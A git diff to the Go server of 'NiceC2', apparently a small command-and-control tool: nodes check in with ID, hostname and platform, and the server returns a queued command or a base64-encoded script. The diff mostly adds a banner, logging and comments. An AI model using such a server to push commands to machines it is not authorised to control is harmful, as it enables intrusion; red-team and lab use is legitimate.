@@ -13,24 +13,34 @@ import (
 	"github.com/gorilla/mux"
 )
 
+const banner string = `
+
+███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
+████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
+██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
+██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
+██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+                                                                                                  
+
+`
+
 type Command struct {
 	NodeID  string `json:"NodeID"`
 	Action  string `json:"Action"`
 	Content string `json:"Command"`
 }
 
-func homePage(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprint(w, "Homepage endpoint hit")
-}
-
 type node_check_in struct {
-	ID string
+	ID       string
+	Hostname string
+	Platform string
 }
 
 func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
+	// Get's the current time
 	dt := time.Now()
-	fmt.Println(dt.String())
 
 	// Decode the json body
 	decoder := json.NewDecoder(req.Body)
@@ -40,10 +50,16 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 		panic(err)
 	}
 
-	log.Println(node.ID + " Checked in")
+	// Output something pretty
+	fmt.Println()
+	fmt.Println("============= New Check in =============")
 
-	// Sending a nice response
-	// fmt.Fprint(w, "Node has checked in!")
+	fmt.Println("ID: " + node.ID)
+	fmt.Println("Hostname: " + node.Hostname)
+	fmt.Println("Platform: " + node.Platform)
+	fmt.Println("Time: " + dt.String())
+
+	fmt.Println("============= ----------- =============")
 
 	//JSON reponse
 
@@ -57,6 +73,7 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 		"details": "` + Command + `"
 	}`)
 
+	// Send the response back
 	fmt.Fprintf(w, string(response))
 
 }
@@ -80,6 +97,7 @@ func nodeSendFile(w http.ResponseWriter, req *http.Request) {
 		"details": "` + script + `"
 	}`)
 
+	// Sending the reponse
 	fmt.Fprintf(w, string(response))
 
 }
@@ -87,8 +105,6 @@ func nodeSendFile(w http.ResponseWriter, req *http.Request) {
 func handleRequests() {
 
 	myRouter := mux.NewRouter().StrictSlash(true)
-
-	myRouter.HandleFunc("/", homePage)
 
 	// myRouter.HandleFunc("/test", shrug).Methods("GET")
 	myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")
@@ -100,14 +116,10 @@ func handleRequests() {
 
 func main() {
 
-	fmt.Println("NiceC2 server")
+	fmt.Println(banner)
 
 	handleRequests()
 
-}
-
-func shrug() {
-	fmt.Println("🤷")
 }
 
 func refresh_commands() string {
@@ -128,7 +140,7 @@ func read_script(path string) string {
 	script := string(bFile)
 	// script = strings.Replace(script, "\n", "", -1)
 
-	fmt.Println(script)
+	// fmt.Println(script)
 
 	// here is where we turn the file into some nice data I think
 	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))
